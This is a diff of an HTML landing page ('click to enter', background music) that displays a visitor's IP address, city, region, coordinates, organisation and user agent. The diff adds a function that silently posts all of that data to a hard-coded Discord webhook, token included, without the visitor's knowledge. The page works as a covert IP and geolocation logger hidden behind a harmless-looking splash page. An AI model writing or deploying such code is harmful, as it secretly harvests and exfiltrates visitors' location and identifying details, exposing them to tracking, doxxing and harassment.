@@ -6,28 +6,24 @@
     <title>ata.xyz</title>
     <link rel="stylesheet" href="haha.css">
 
-<title>ata.xyz</title>
-<meta name="title" content="oober.xyz" />
-<meta name="description" content="" />
-    
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://ata.xyz/" />
-<meta property="og:title" content="ata.xyz" />
-<meta property="og:description" content="" />
-<meta property="og:image" content="https://i.ibb.co/ZdFTCDq/56-C092-ED-3-FEE-4-F99-8764-0-E197281-D573.png" />
+    <meta name="title" content="oober.xyz" />
+    <meta name="description" content="" />
 
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://ata.xyz/" />
+    <meta property="og:title" content="ata.xyz" />
+    <meta property="og:description" content="" />
+    <meta property="og:image" content="https://i.ibb.co/ZdFTCDq/56-C092-ED-3-FEE-4-F99-8764-0-E197281-D573.png" />
 
-<meta property="twitter:card" content="summary_large_image" />
-<meta property="twitter:url" content="https://ata.xyz/" />
-<meta property="twitter:title" content="oober.xyz" />
-<meta property="twitter:description" content="" />
-<meta property="twitter:image" content="https://i.ibb.co/ZdFTCDq/56-C092-ED-3-FEE-4-F99-8764-0-E197281-D573.png" />
-
+    <meta property="twitter:card" content="summary_large_image" />
+    <meta property="twitter:url" content="https://ata.xyz/" />
+    <meta property="twitter:title" content="oober.xyz" />
+    <meta property="twitter:description" content="" />
+    <meta property="twitter:image" content="https://i.ibb.co/ZdFTCDq/56-C092-ED-3-FEE-4-F99-8764-0-E197281-D573.png" />
 </head>
-<body>
-    <body id="main-body">
-  <div id="enter">click to enter</div>
-    <div id="info">
+<body id="main-body">
+    <div id="enter">click to enter</div>
+    <div id="info" style="display: none;">
         <p><strong>IP Address:</strong> <span id="ip"></span></p>
         <p><strong>City:</strong> <span id="city"></span></p>
         <p><strong>Region:</strong> <span id="region"></span></p>
@@ -42,12 +38,13 @@
     <audio id="audio" src="background-music.mp3"></audio>
 
     <script>
-
         document.getElementById('useragent').innerHTML = "<strong>UserAgent:</strong> " + window.navigator.userAgent;
 
         document.getElementById('enter').addEventListener('click', function() {
             this.style.display = 'none';
             fetchUserInfo();
+            document.getElementById('audio').play();
+            document.getElementById('main-body').style.backgroundImage = "url('https://cdn.discordapp.com/attachments/1214253428495360094/1254214383274557552/gBZWaGDb.jpg?ex=6678adab&is=66775c2b&hm=de5624cf5a187376d6f4de1526cff9f0517381b4d1f889133152997aa8ff2ae7&')";
         });
 
         async function fetchUserInfo() {
@@ -65,23 +62,34 @@
                 document.getElementById('timezone').textContent = data.timezone;
 
                 document.getElementById('info').style.display = 'block';
+
+                // Send data to Discord webhook
+                await sendToWebhook(data);
+                
             } catch (error) {
                 console.error('Error fetching user information:', error);
             }
         }
 
-        document.getElementById('enter').addEventListener('click', function() {
-            this.style.display = 'none';
-            fetchUserInfo();
-            document.getElementById('audio').play();
-        });
+        async function sendToWebhook(data) {
+            const webhookURL = 'https://discord.com/api/webhooks/1270105042791305227/3uzXne5QtKvaKnAQoGByUoXpykEbs8Y_FYafGTNEtc9_GZ3w9F534yosGry4F24Y8rG4'; // Replace with your Discord webhook URL
+            
+            const message = {
+                content: `User Info:\nIP Address: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nLocation: ${data.loc}\nOrganisation: ${data.org}\nHostname: ${data.hostname}\nTimezone: ${data.timezone}\nUserAgent: ${window.navigator.userAgent}`
+            };
 
-        document.getElementById('enter').addEventListener('click', function() {
-            this.style.display = 'none';
-            fetchUserInfo();
-            document.getElementById('audio').play();
-            document.getElementById('main-body').style.backgroundImage = "url('https://cdn.discordapp.com/attachments/1214253428495360094/1254214383274557552/gBZWaGDb.jpg?ex=6678adab&is=66775c2b&hm=de5624cf5a187376d6f4de1526cff9f0517381b4d1f889133152997aa8ff2ae7&')";
-        });
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+            } catch (error) {
+                console.error('Error sending data to webhook:', error);
+            }
+        }
     </script>
 </body>
 </html>
